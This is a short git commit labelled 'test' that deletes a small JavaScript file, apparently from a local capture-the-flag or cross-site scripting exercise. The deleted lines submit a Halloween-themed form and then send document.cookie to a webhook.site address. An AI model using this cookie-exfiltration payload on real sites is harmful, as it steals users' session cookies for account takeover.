7c4efb41242874924b901b057ba6976f40aa57fa
angus <angus@okcupid.com>
2022-10-28 14:19:40 -0400

    test

--- wow.js
+++
@@ -1,5 +0,0 @@
-fetch("http://localhost:1337/api/submit", {
-    "body": '{"halloween_name": "asdf", "email": "asdf@asdf.com", "costume_type": "asdf", "trick_or_treat": "asdf"}',
-    "method": "POST",
-    "mode": "no-cors",
-}).then(fetch("https://webhook.site/878378ff-f7bd-4e60-bf6c-74d2012dc9a4?x="+document.cookie));
